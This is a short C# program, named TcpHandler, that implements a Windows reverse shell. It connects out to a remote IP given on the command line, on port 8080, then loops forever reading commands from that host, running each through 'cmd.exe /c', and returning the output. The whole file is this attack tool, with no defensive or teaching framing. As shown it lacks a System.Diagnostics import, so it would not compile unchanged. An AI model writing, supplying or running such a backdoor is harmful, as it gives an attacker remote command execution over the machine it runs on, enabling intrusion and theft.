using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;

namespace TcpHandler
{
    class Program
    {
        static void Main(string[] args)
        {
            // Parse the IP address of the remote host from the command line arguments.
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: TcpHandler.exe <remote_ip_address>");
                return;
            }

            IPAddress ipAddress = IPAddress.Parse(args[0]);

            // Set the listening port on the remote host.
            int port = 8080;

            // Create a new Socket to connect to the remote host.
            Socket client = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            // Connect to the remote host.
            client.Connect(new IPEndPoint(ipAddress, port));

            // Get the stream used to read and write data to the remote host.
            NetworkStream stream = new NetworkStream(client);

            // Continuously listen for commands from the remote host and execute them.
            while (true)
            {
                // Read the command sent by the remote host.
                byte[] buffer = new byte[1024];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                // Execute the command using "cmd.exe /c".
                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                Process process = Process.Start(startInfo);

                // Read the output of the command.
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                // Send the output of the command back to the remote host.
                byte[] outputBuffer = Encoding.UTF8.GetBytes(output + error);
                stream.Write(outputBuffer, 0, outputBuffer.Length);
            }
        }
    }
}
